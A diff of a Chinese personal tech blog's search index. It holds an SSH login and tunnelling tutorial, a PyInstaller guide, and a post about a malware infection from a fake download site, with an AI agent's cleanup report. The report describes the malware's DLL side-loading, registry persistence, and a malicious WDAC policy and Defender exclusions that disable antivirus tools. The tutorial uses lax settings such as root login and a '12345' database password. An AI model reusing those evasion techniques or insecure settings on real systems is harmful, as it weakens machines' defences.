+<h4 id="什么是SSH"><a href="#什么是SSH" class="headerlink" title="什么是SSH"></a>什么是SSH</h4><p>SSH (Secure Shell 安全外壳协议)是为远程登录会话和其他网络服务提供安全性的网络协议。利用SSH协议可以有效防止远程管理过程中的信息泄露问题，即使被中途截获，密码和数据也不会泄露。可以防止中间人(man-in-the-middle)攻击。</p>
+<h4 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h4><p>之前的deepin使用的是OpenSSH，默认使用口令的安全验证，就是只有账号和口令就可以登录远程主机。因为之前改过端口，需要同通过参数-p来指定端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.112.128 -p 122</span><br></pre></td></tr></table></figure>
+
+<p>第一次登录时，会提示你确认主机的真实性，yes后会提示你输入密码，如图<br><img src="/img/20210625/2.png" alt></p>
+<h4 id="私钥登录"><a href="#私钥登录" class="headerlink" title="私钥登录"></a>私钥登录</h4><p>现在改为基于密匙的安全验证，通过一对密钥进行安全认证。</p>
+<p>执行<code>ssh-keygen</code>生成公钥和私钥，公钥（通常做法是使用-t参数，指定密钥的加密算法，如dsa rsa），生成时会询问一些问题，一般默认回车就好，这里设置私钥密码。<br>第一个问题询问密钥保存的文件名。</p>
+<blockquote>
+<p>Enter file in which to save the key (/root/.ssh/id_rsa):</p>
+</blockquote>
+<p>第二个问题询问私钥是否设定密码保护,直接回车就默认为空。这里设置，然后再确认一遍密码。</p>
+<blockquote>
+<p>Enter passphrase (empty for no passphrase): </p>
+</blockquote>
+<p><img src="/img/20210625/3.png" alt></p>
+<blockquote>
+<p>id_rsa 生成的私钥文件<br>id_rsa.pub 生成的公钥文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改sshd_config</span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+<p>修改如下</p>
+<blockquote>
+<p>#root用户登录<br>PermitRootLogin yes</p>
+<p>#密钥认证<br>PubkeyAuthentication yes</p>
+<p>#密码认证（可以关闭，关闭后只能通过密钥进入）<br>PasswordAuthentication yes</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#重启SSH</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#私钥登录，把远程主机的私钥发放给客户端用户</span><br><span class="line">ssh root@192.168.112.128 -p 122 -i C:/Users/xuchl/.ssh/deepin_rsa</span><br></pre></td></tr></table></figure>
+
+<p>因为我有设置私钥密码，这里需要输入私钥密码。<br><img src="/img/20210625/4.png" alt></p>
+<h4 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h4><p>公钥登录，要客户端公钥写入远程主机authorized_keys文件中，这里直接复制粘贴的，试了几个linux命令都没有实现。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改sshd_config</span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+<p>修改如下</p>
+<blockquote>
+<p>PubkeyAuthentication yes<br>AuthorizedKeysFile .ssh/authorized_keys</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改文件权限</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>PS:这里的文件使用root用户建的，其他用户通过密钥登录的话还需要再输入一遍密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#公钥登录</span><br><span class="line">ssh root@192.168.112.128 -p 122</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/20210625/5.png" alt></p>
+<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>本地1和服务器2无法直接连接，但是中继3可以连接1和2，1通过3连上2。本地1到中继3形成数据传输的秘密隧道，即SSH隧道。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#本地1执行（本地1端口:服务器2:服务器2端口 中继3）</span><br><span class="line">ssh -L 1121:192.168.112.128:122 192.168.112.3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过本地的1121端口就可以直接登录服务器</span><br><span class="line">ssh -p 1121 root@localhost</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/20210625/6.png" alt></p>
+<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><p>本地1和服务器2无法直接连接，并且本地1无法连接中继3，但是中继3可以连接1和2，1通过3连上2。<br>额，这个没成功，win10连不上，不保证正确。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中继3执行（中继3端口:服务器2:服务器2端口 本地1）</span><br><span class="line">ssh -R 1122:192.168.112.128:122 192.168.88.27</span><br></pre></td></tr></table></figure>
+
+<h4 id="示例：通过SSH通道连接MariaDB"><a href="#示例：通过SSH通道连接MariaDB" class="headerlink" title="示例：通过SSH通道连接MariaDB"></a>示例：通过SSH通道连接MariaDB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过Docker拉取最新MariaDB镜像</span><br><span class="line">docker pull mariadb</span><br><span class="line">#简单创建容器并启动</span><br><span class="line">docker run --name mariadb -p 3306:3306 -e MYSQL_ROOT_PASSWORD=12345 mariadb:latest</span><br></pre></td></tr></table></figure>
+
+<p>通过SSH通道登录数据库<br><img src="/img/20210625/7.jpg" alt></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
@@ -1132,91 +1217,6 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
-    <title>Python程序使用Pyinstaller打包成exe可执行文件</title>
-    <url>/2023/10/23/Python%E7%A8%8B%E5%BA%8F%E4%BD%BF%E7%94%A8Pyinstaller%E6%89%93%E5%8C%85%E6%88%90exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="Python程序使用Pyinstaller打包成exe可执行文件"><a href="#Python程序使用Pyinstaller打包成exe可执行文件" class="headerlink" title="Python程序使用Pyinstaller打包成exe可执行文件"></a>Python程序使用Pyinstaller打包成exe可执行文件</h2><p><em>给朋友写过几个工具，VBA和Python都有，不过朋友更喜欢Python，于是又出了一个Python版。为了方便对方运行，就又打包成exe可执行文件</em></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为什么要打包成exe可执行文件，主要是为了在没有装Python的电脑上运行，以及方便不懂编程的小伙伴运行。打包成exe可执行文件的话，Windows平台差不多都能运行，只发一个exe文件就好（前提是打包成一个exe，而不是文件夹）。<br>Pyinstaller的详细介绍可以去<a href="https://pyinstaller.org/en/stable/" target="_blank" rel="noopener"><code>Pyinstaller官网</code></a>查看，这里只是简单介绍一下Pyinstaller，实际使用上基本用几个参数就好。</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Windows直接在cmd中用pip安装就好，如果安装较慢可以切换国内源试试。<br><code>pip install pyinstaller</code></p>
-<p>我这里以前安装过了，当然也可用用<code>pip install --upgrade pyinstaller</code>更新一下版本。下面就是一个简单的打包操做，打包过程时间稍微有点长<br><img src="/img/20231023/1.png" alt></p>
-<h3 id="主要命令参数"><a href="#主要命令参数" class="headerlink" title="主要命令参数"></a>主要命令参数</h3><p>Pyinstaller使用的时候注意参数大小写，一般有两种参数写法，比如查看版本可以使用<code>-v</code>或者<code>--version</code>。<br><code>-h</code>或者<code>--help</code>查看Pyinstaller的帮助信息，我为了方便（偷懒），全部使用简写的参数形式<br><img src="/img/20231023/2.png" alt></p>
-<p><code>-F</code> 创建一个可执行文件，写小工具的时候推荐<br>执行<code>pyinstaller -F pyReadEx.py</code>后效果如下，会成成build，dist文件夹以及扩展名为spec的文件，exe可执行文件会在dist目录下<br><img src="/img/20231023/3.png" alt><br><code>-D</code> 默认参数，创建一个文件夹包含可执行文件<br><img src="/img/20231023/4.png" alt></p>
-<p><code>-i</code> 设置icon图标</p>
-<p><code>-n</code> 设置名字，省略的话直接使用第一个py脚本文件名<br><img src="/img/20231023/5.png" alt></p>
-<p><code>-w</code> 使用窗口执行，不会打开控制台（Windows专用）。比如我的脚本有个print提示，使用此参数后就看不到了<br><code>-c</code> 默认参数，使用控制台执行（Windows专用）</p>
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>只是写小工具的话，上面的参数够用了。不过有时打包成exe的话，文件会很大，貌似Pyinstaller打包的时候很多不必要的库也会打包进去，可以考虑弄一个纯净的Python环境打包。现在Windows系统基本都是64位，Python也是64位的，基本不考虑32位系统，如果需要32位的exe的话，可以用32的Python进行打包。</p>
-]]></content>
-      <tags>
-        <tag>Python</tag>
-        <tag>Pyinstaller</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSH远程登录</title>
-    <url>/2021/06/25/SSH%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a>SSH远程登录</h1><p><em>起因是服务器在儿童节那天数据库连不上了，原因是中了之前横行的勒索病毒的变种……然后就有了后来的各种加强：windos变更为linux,通过SSH连接等等，这里就简单梳理一下SSH的相关知识</em><br><img src="/img/20210625/1.jpg" alt></p>
-<h4 id="什么是SSH"><a href="#什么是SSH" class="headerlink" title="什么是SSH"></a>什么是SSH</h4><p>SSH (Secure Shell 安全外壳协议)是为远程登录会话和其他网络服务提供安全性的网络协议。利用SSH协议可以有效防止远程管理过程中的信息泄露问题，即使被中途截获，密码和数据也不会泄露。可以防止中间人(man-in-the-middle)攻击。</p>
-<h4 id="口令登录"><a href="#口令登录" class="headerlink" title="口令登录"></a>口令登录</h4><p>之前的deepin使用的是OpenSSH，默认使用口令的安全验证，就是只有账号和口令就可以登录远程主机。因为之前改过端口，需要同通过参数-p来指定端口。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.112.128 -p 122</span><br></pre></td></tr></table></figure>
-
-<p>第一次登录时，会提示你确认主机的真实性，yes后会提示你输入密码，如图<br><img src="/img/20210625/2.png" alt></p>
-<h4 id="私钥登录"><a href="#私钥登录" class="headerlink" title="私钥登录"></a>私钥登录</h4><p>现在改为基于密匙的安全验证，通过一对密钥进行安全认证。</p>
-<p>执行<code>ssh-keygen</code>生成公钥和私钥，公钥（通常做法是使用-t参数，指定密钥的加密算法，如dsa rsa），生成时会询问一些问题，一般默认回车就好，这里设置私钥密码。<br>第一个问题询问密钥保存的文件名。</p>
-<blockquote>
-<p>Enter file in which to save the key (/root/.ssh/id_rsa):</p>
-</blockquote>
-<p>第二个问题询问私钥是否设定密码保护,直接回车就默认为空。这里设置，然后再确认一遍密码。</p>
-<blockquote>
-<p>Enter passphrase (empty for no passphrase): </p>
-</blockquote>
-<p><img src="/img/20210625/3.png" alt></p>
-<blockquote>
-<p>id_rsa 生成的私钥文件<br>id_rsa.pub 生成的公钥文件</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改sshd_config</span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
-
-<p>修改如下</p>
-<blockquote>
-<p>#root用户登录<br>PermitRootLogin yes</p>
-<p>#密钥认证<br>PubkeyAuthentication yes</p>
-<p>#密码认证（可以关闭，关闭后只能通过密钥进入）<br>PasswordAuthentication yes</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#重启SSH</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#私钥登录，把远程主机的私钥发放给客户端用户</span><br><span class="line">ssh root@192.168.112.128 -p 122 -i C:/Users/xuchl/.ssh/deepin_rsa</span><br></pre></td></tr></table></figure>
-
-<p>因为我有设置私钥密码，这里需要输入私钥密码。<br><img src="/img/20210625/4.png" alt></p>
-<h4 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h4><p>公钥登录，要客户端公钥写入远程主机authorized_keys文件中，这里直接复制粘贴的，试了几个linux命令都没有实现。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改sshd_config</span><br><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
-
-<p>修改如下</p>
-<blockquote>
-<p>PubkeyAuthentication yes<br>AuthorizedKeysFile .ssh/authorized_keys</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改文件权限</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-<p>PS:这里的文件使用root用户建的，其他用户通过密钥登录的话还需要再输入一遍密码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#公钥登录</span><br><span class="line">ssh root@192.168.112.128 -p 122</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/20210625/5.png" alt></p>
-<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>本地1和服务器2无法直接连接，但是中继3可以连接1和2，1通过3连上2。本地1到中继3形成数据传输的秘密隧道，即SSH隧道。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#本地1执行（本地1端口:服务器2:服务器2端口 中继3）</span><br><span class="line">ssh -L 1121:192.168.112.128:122 192.168.112.3</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过本地的1121端口就可以直接登录服务器</span><br><span class="line">ssh -p 1121 root@localhost</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/20210625/6.png" alt></p>
-<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><p>本地1和服务器2无法直接连接，并且本地1无法连接中继3，但是中继3可以连接1和2，1通过3连上2。<br>额，这个没成功，win10连不上，不保证正确。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中继3执行（中继3端口:服务器2:服务器2端口 本地1）</span><br><span class="line">ssh -R 1122:192.168.112.128:122 192.168.88.27</span><br></pre></td></tr></table></figure>
-
-<h4 id="示例：通过SSH通道连接MariaDB"><a href="#示例：通过SSH通道连接MariaDB" class="headerlink" title="示例：通过SSH通道连接MariaDB"></a>示例：通过SSH通道连接MariaDB</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过Docker拉取最新MariaDB镜像</span><br><span class="line">docker pull mariadb</span><br><span class="line">#简单创建容器并启动</span><br><span class="line">docker run --name mariadb -p 3306:3306 -e MYSQL_ROOT_PASSWORD=12345 mariadb:latest</span><br></pre></td></tr></table></figure>
-
-<p>通过SSH通道登录数据库<br><img src="/img/20210625/7.jpg" alt></p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-        <tag>SSH</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Vue element-china-area-data 数据源修改</title>
     <url>/2020/06/19/Vue-element-china-area-data-%E6%95%B0%E6%8D%AE%E6%BA%90%E4%BF%AE%E6%94%B9/</url>
     <content><![CDATA[<p><em>Vue前台需要省市区三级联动，但是element-china-area-data的regionData数据太旧了，而且有部分数据不符合现有系统的逻辑。于是乎……</em></p>
@@ -1389,6 +1389,20 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
+    <title>不吐不快-博客修改路上的一些事（人无千日好，花无百日红）</title>
+    <url>/2024/11/28/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%94%B9%E8%B7%AF%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B%EF%BC%88%E4%BA%BA%E6%97%A0%E5%8D%83%E6%97%A5%E5%A5%BD%EF%BC%8C%E8%8A%B1%E6%97%A0%E7%99%BE%E6%97%A5%E7%BA%A2%EF%BC%89/</url>
+    <content><![CDATA[<p><em>博客很久没有太大的更新，发现有些功能已经不能用了……引用第三方代码的功能，有的停运了，有的接口变了，只能修改对应的功能了。人无千日好，花无百日红。时间的车轮会碾过一切</em></p>
+<h3 id="停运的RevolverMaps"><a href="#停运的RevolverMaps" class="headerlink" title="停运的RevolverMaps"></a>停运的RevolverMaps</h3><p>links页的3D地球访问统计不显示了，发现第三方的RevolverMaps网站已经关停了。因为是记录访问位置的，数据也没了，只能去掉对应的代码了。<br><img src="/img/20241128/1.png" alt></p>
+<h3 id="高德地图接口调整"><a href="#高德地图接口调整" class="headerlink" title="高德地图接口调整"></a>高德地图接口调整</h3><p>高德地图行政区域查询报错了，原因是重复的区名不能用上一级加区名来查询了。比如普陀区，有“上海市普陀区”，“舟山市普陀区”，现在查询都是没有返回结果的，只有查询“普陀区”才返回上海市普陀区。提了下工单，给的结论就是建议使用行政区域代码来查询。于是在原来数据的基础上，加个一个高德地图专用的变量，用行政区域代码来代替原来的中文。<br><img src="/img/20241128/2.png" alt><br>高德地图从2024年7月15日起，对于个人认证开发者、已购买商用服务的企业认证开发者以及列入“乘风计划”的企业认证开发者，我们将每月提供一定价值的使用配额以供使用基础服务，基础服务具体内容及配额详见产品定价。能看见自己使用的费用了，因为个人用，很难能超过上限，不过QPS貌似变少了，导致我无法显示出所有要查询的行政区域。于是只能降低QPS了，改写了原来的方法，通过setTimeout设置了400ms的延迟。虽然不能同时显示出来，但慢慢的会在页面上显现出来。<br><img src="/img/20241128/3.png" alt></p>
+<h3 id="百度地图接口调整"><a href="#百度地图接口调整" class="headerlink" title="百度地图接口调整"></a>百度地图接口调整</h3><p>百度JavaScript API调用的服务额度将于2023年3月15日进行调整，其中个人认证，JS地点检索的日配额变为100，基本用用就超，QPS为30，还好。访问几次足迹，下图就成为常态。<br><img src="/img/20241128/4.png" alt><br>但是新版的GL，行政区域查询不会记录在JS地点检索中。不过有一个小插曲，就是查杭州市“西湖区”的时候直接变成了武汉市“东西湖区”……而且还不改……<br><img src="/img/20241128/5.png" alt></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其他也修改了很多，改了不少。像hexo的主题后续更新，因为自己改过源代码，只能手动更改，比如检索功能，很早之前加的了。11月最近自己的时间变多了，对博客的修改也变多了。<br><img src="/img/20241128/6.png" alt><br>人无千日好，花无百日红。写博客纯粹是个人兴趣，不知道能坚持多久。不过域名已经又买了3年（价格越来越贵），再坚持几年应该没有太大问题。</p>
+]]></content>
+      <tags>
+        <tag>博客</tag>
+        <tag>吐槽</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>不吐不快-记录ASM小助手卸载过程</title>
     <url>/2020/12/09/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E8%AE%B0%E5%BD%95ASM%E5%B0%8F%E5%8A%A9%E6%89%8B%E5%8D%B8%E8%BD%BD%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="不吐不快-记录ASM小助手卸载过程"><a href="#不吐不快-记录ASM小助手卸载过程" class="headerlink" title="不吐不快-记录ASM小助手卸载过程"></a>不吐不快-记录ASM小助手卸载过程</h2><p><em>吐槽专用，图片是卸载的时候弄的，不是很全</em></p>
@@ -1410,17 +1424,338 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
-    <title>不吐不快-博客修改路上的一些事（人无千日好，花无百日红）</title>
-    <url>/2024/11/28/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%94%B9%E8%B7%AF%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B%EF%BC%88%E4%BA%BA%E6%97%A0%E5%8D%83%E6%97%A5%E5%A5%BD%EF%BC%8C%E8%8A%B1%E6%97%A0%E7%99%BE%E6%97%A5%E7%BA%A2%EF%BC%89/</url>
-    <content><![CDATA[<p><em>博客很久没有太大的更新，发现有些功能已经不能用了……引用第三方代码的功能，有的停运了，有的接口变了，只能修改对应的功能了。人无千日好，花无百日红。时间的车轮会碾过一切</em></p>
-<h3 id="停运的RevolverMaps"><a href="#停运的RevolverMaps" class="headerlink" title="停运的RevolverMaps"></a>停运的RevolverMaps</h3><p>links页的3D地球访问统计不显示了，发现第三方的RevolverMaps网站已经关停了。因为是记录访问位置的，数据也没了，只能去掉对应的代码了。<br><img src="/img/20241128/1.png" alt></p>
-<h3 id="高德地图接口调整"><a href="#高德地图接口调整" class="headerlink" title="高德地图接口调整"></a>高德地图接口调整</h3><p>高德地图行政区域查询报错了，原因是重复的区名不能用上一级加区名来查询了。比如普陀区，有“上海市普陀区”，“舟山市普陀区”，现在查询都是没有返回结果的，只有查询“普陀区”才返回上海市普陀区。提了下工单，给的结论就是建议使用行政区域代码来查询。于是在原来数据的基础上，加个一个高德地图专用的变量，用行政区域代码来代替原来的中文。<br><img src="/img/20241128/2.png" alt><br>高德地图从2024年7月15日起，对于个人认证开发者、已购买商用服务的企业认证开发者以及列入“乘风计划”的企业认证开发者，我们将每月提供一定价值的使用配额以供使用基础服务，基础服务具体内容及配额详见产品定价。能看见自己使用的费用了，因为个人用，很难能超过上限，不过QPS貌似变少了，导致我无法显示出所有要查询的行政区域。于是只能降低QPS了，改写了原来的方法，通过setTimeout设置了400ms的延迟。虽然不能同时显示出来，但慢慢的会在页面上显现出来。<br><img src="/img/20241128/3.png" alt></p>
-<h3 id="百度地图接口调整"><a href="#百度地图接口调整" class="headerlink" title="百度地图接口调整"></a>百度地图接口调整</h3><p>百度JavaScript API调用的服务额度将于2023年3月15日进行调整，其中个人认证，JS地点检索的日配额变为100，基本用用就超，QPS为30，还好。访问几次足迹，下图就成为常态。<br><img src="/img/20241128/4.png" alt><br>但是新版的GL，行政区域查询不会记录在JS地点检索中。不过有一个小插曲，就是查杭州市“西湖区”的时候直接变成了武汉市“东西湖区”……而且还不改……<br><img src="/img/20241128/5.png" alt></p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其他也修改了很多，改了不少。像hexo的主题后续更新，因为自己改过源代码，只能手动更改，比如检索功能，很早之前加的了。11月最近自己的时间变多了，对博客的修改也变多了。<br><img src="/img/20241128/6.png" alt><br>人无千日好，花无百日红。写博客纯粹是个人兴趣，不知道能坚持多久。不过域名已经又买了3年（价格越来越贵），再坚持几年应该没有太大问题。</p>
+    <title>不吐不快-记录AI智能体清除病毒</title>
+    <url>/2026/09/08/%E4%B8%8D%E5%90%90%E4%B8%8D%E5%BF%AB-%E8%AE%B0%E5%BD%95AI%E6%99%BA%E8%83%BD%E4%BD%93%E6%B8%85%E9%99%A4%E7%97%85%E6%AF%92/</url>
+    <content><![CDATA[<p><em>现在AI的发展真的很快，基本每周都有新的AI模型发布，智能体也今非昔比。大家都开始用AI来写代码，解决问题，Stack Overflow人少了，图画平面设计被取代，因为AI的爬取，技术站的有效访问量下降……因为不干开发，加上大部分问题都可以让AI解决，也很少发博客来记录了。最近，因为在外面，被朋友推荐使用智能体WorkBuddy，第一次使用是在8月12号，并没有太深入，依旧坚持使用网页版，半手搓，后面才渐渐开始依赖。记录一次和病毒的攻防，源于我的粗心</em></p>
+<p><strong>现在AI的发展真的很快，基本每周都有新的AI模型发布，智能体也今非昔比。大家都开始用AI来写代码，解决问题，Stack Overflow人少了，图画平面设计被取代，因为AI的爬取，技术站的有效访问量下降……因为不干开发，加上大部分问题都可以让AI解决，也很少发博客来记录了。最近，因为在外面，被朋友推荐使用智能体WorkBuddy，第一次使用是在8月12号，并没有太深入，依旧坚持使用网页版，半手搓，后面才渐渐开始依赖。记录一次和病毒的攻防，源于我的粗心</strong></p>
+<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>白天发现系统日志缺失了0点以后的操作，当时测试的时候存在，因为晚上导出过，后来因为测试没有全部完成就又把下载的日志删除了。为了复原，于是用AI进行复原，提示我用可行的途径是磁盘级扫描恢复（用免费的 PhotoRec 工具扫描 C 盘被删除但尚未覆盖的数据块）。<br><img src="/img/20260908/0.png" alt><br>因为一直下载失败，就想着自己手动下载，于是用必应进行搜索，直接下载了第一个网站（中文仿冒站，唯一官方站是cgsecurity.org）的压缩包。<br><img src="/img/20260908/1.png" alt><br>在没有怀疑的情况下，直接运行了压缩包里的文件。系统弹窗，确认运行，然后继续弹窗，这是已经感觉有点不对了，就点了取消。但是一直弹窗，任务管理器也无法调出，于是点了是，然后恢复正常，但是没有任何安装的痕迹。开始以为安装失败，就没有在意，然后发现华为电脑管家自带文件恢复工具，但是依旧无法复原。后续发现下载链接还能用，可以重新下载，至此，文件找回，但是，病毒已经扎根在电脑中。</p>
+<p>事后证明，就是因为这个文件导致电脑中毒，并且网站压缩包的版本号一直在变。<br><img src="/img/20260908/2.png" alt></p>
+<h4 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h4><p>后续工作中发现电脑风扇转速异常，打开任务管理器发现两个名字随机的异常进程。<br><img src="/img/20260908/3.png" alt><br>切断网络，结束进程后依旧会自己重启进程。启动项中也发现两个新加的启动项，指定文件夹位置不可见，勾选隐藏文件后依旧不显示，基本判定为属性带系统文件。有一个文件还好，文件夹能够发现，因为没有装其他杀毒软件，于是用Windows Defender的防病毒脱机版进行扫描。<br><img src="/img/20260908/4.jpg" alt></p>
+<p>事后软件恢复后事后查看日志缺是排除了一些，但是不全。<br><img src="/img/20260908/4.png" alt><br>当时只成功排除一个，启动项中依旧残留一个。<br><img src="/img/20260908/5.png" alt><br>此时，Windows Defender已经无法正常开启了。于是手动添加文件目录权限，物理删除启动项对应的文件夹。<br><img src="/img/20260908/6.png" alt><br>但是进程中依旧存在随机名字进程，打开文件所在位置基本都是不可见，可见的有些数字签名为腾讯。这是想既然自带不好使，就装个360杀毒试试，结果安装完成提示“损坏的映像”，打开时提示“你的组织使用适用于企业的应用控制阻止此应用”。<br><img src="/img/20260908/7.png" alt><br>至此，杀毒软件也被堵死，看来病毒针对杀毒软件进行了限制（WDAC 应用控制策略）。<br><img src="/img/20260908/7-2.png" alt><br>于是想起了智能体，于是把任务抛给了智能体。<br><img src="/img/20260908/8.png" alt><br>后续权限从“默认权限”改为<code>允许完全访问</code>并以管理员权限重新启动WorkBuddy，然后智能体大胜利！<br><img src="/img/20260908/9.png" alt><br><img src="/img/20260908/10.png" alt><br>然后360杀毒就能进入了，进行快速扫描，扫除关键位置病毒。然后再进行全盘扫描，彻底清除剩余病毒。<br><img src="/img/20260908/11.png" alt><br>最后举报一波网站，微软不安全网站报告<br><img src="/img/20260908/12.png" alt><br>工信部 12321 举报中心<br><img src="/img/20260908/13.png" alt></p>
+<p>最后看看智能体给的报告，看来以后病毒还要防御智能体了（笑）</p>
+<h1 id="电脑病毒清除与-Windows-Defender-修复报告"><a href="#电脑病毒清除与-Windows-Defender-修复报告" class="headerlink" title="电脑病毒清除与 Windows Defender 修复报告"></a>电脑病毒清除与 Windows Defender 修复报告</h1><ul>
+<li><strong>处理日期</strong>：2026-08-31（下午 14:53 – 16:00）</li>
+<li><strong>处理对象</strong>：个人电脑（Windows 11，用户 00RAISER）</li>
+<li><strong>最终结论</strong>：✅ 成功清除 2 个恶意程序（含远控后门）、4 类持久化机制、1 条恶意系统策略、5 个被污染的 Defender 排除项；Windows Defender 已完全恢复实时保护</li>
+</ul>
+<hr>
+<h2 id="一、事件概述"><a href="#一、事件概述" class="headerlink" title="一、事件概述"></a>一、事件概述</h2><h3 id="1-1-用户报告的症状"><a href="#1-1-用户报告的症状" class="headerlink" title="1.1 用户报告的症状"></a>1.1 用户报告的症状</h3><ul>
+<li>电脑疑似中毒</li>
+<li>Windows “病毒和威胁防护”右键菜单消失</li>
+<li>安全相关服务无法启动</li>
+<li>用户已手动清除一个病毒，启动项中残留另一个</li>
+</ul>
+<h3 id="1-2-处置结论（一句话）"><a href="#1-2-处置结论（一句话）" class="headerlink" title="1.2 处置结论（一句话）"></a>1.2 处置结论（一句话）</h3><p>病毒通过”白加黑”（盗用合法签名）+ 随机目录名 + 伪装系统名部署了两套恶意程序，并写入恶意 WDAC 策略和 Defender 排除项锁死杀毒软件；本次已全部清除，Defender 恢复运行。</p>
+<hr>
+<h2 id="二、恶意程序详情"><a href="#二、恶意程序详情" class="headerlink" title="二、恶意程序详情"></a>二、恶意程序详情</h2><h3 id="2-1-恶意程序-1：C-Users-Public-IEC4eK-（白加黑主程序）"><a href="#2-1-恶意程序-1：C-Users-Public-IEC4eK-（白加黑主程序）" class="headerlink" title="2.1 恶意程序 1：C:\Users\Public\IEC4eK\（白加黑主程序）"></a>2.1 恶意程序 1：<code>C:\Users\Public\IEC4eK\</code>（白加黑主程序）</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>创建时间</td>
+<td>2026-08-31 13:46</td>
+</tr>
+<tr>
+<td>文件</td>
+<td><code>MbKSfy.exe</code>（139 KB，主程序，带腾讯签名=白加黑宿主）、<code>UxEnhance64.dll</code>（3.2 MB，恶意库）、<code>adoresd.dat</code>（4.9 MB）、<code>msadox.tb</code></td>
+</tr>
+<tr>
+<td>伪装方式</td>
+<td>注册表启动项命名为 <strong>“Tencent SecurityHealth”</strong>，与正常系统程序 <code>SecurityHealthSystray.exe</code> 鱼目混珠</td>
+</tr>
+<tr>
+<td>持久化 1</td>
+<td><code>HKLM\...\Run</code> 注册表键</td>
+</tr>
+<tr>
+<td>持久化 2</td>
